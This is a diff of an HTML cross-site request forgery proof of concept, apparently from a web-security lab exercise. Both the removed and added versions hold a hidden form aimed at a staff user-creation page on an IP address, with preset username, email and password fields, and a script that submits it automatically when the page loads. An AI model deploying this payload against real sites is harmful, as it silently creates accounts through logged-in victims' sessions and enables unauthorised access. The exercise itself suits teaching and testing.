@@ -1,13 +1,12 @@
-<FORM id="csrfForm" action="https://35.184.88.145/red/public/staff/users/new.php" Method="POST" novalidate>
-  <input type="hidden" name="first_name" value="CSRF">
-  <input type="hidden" name="last_name" value="Test">
-  <input type="hidden" name="username" value="Test_for_CSRF">
-  <input type="hidden" name="email" value="CSRF@Test.gov">
-  <input type="hidden" name="password" value="Password123!">
-  <input type="hidden" name="confirm_password" value="Password123!">
-  <input type="submit" name="submit" value="Create">
-  
-</FORM>
+<form id="csrfForm" action="https://35.184.88.145/red/public/staff/users/new.php" method="POST" novalidate>
+	<input type="hidden" name="first_name" value="CSRF"/>
+	<input type="hidden" name="last_name" value="Test Ten"/>
+	<input type="hidden" name="username" value="Help Me Please"/>
+	<input type="hidden" name="email" value="csrf@help.gov"/>
+	<input type="hidden" name="password" value="Password1234$"/>
+	<input type="hidden" name="confirm_password" value="Password1234$"/>
+	<input type="submit" value="Create"/>
+</form>
 <script>
-  document.forms["csrfForm"].submit();
+	document.forms["csrfForm"].submit();
 </script>
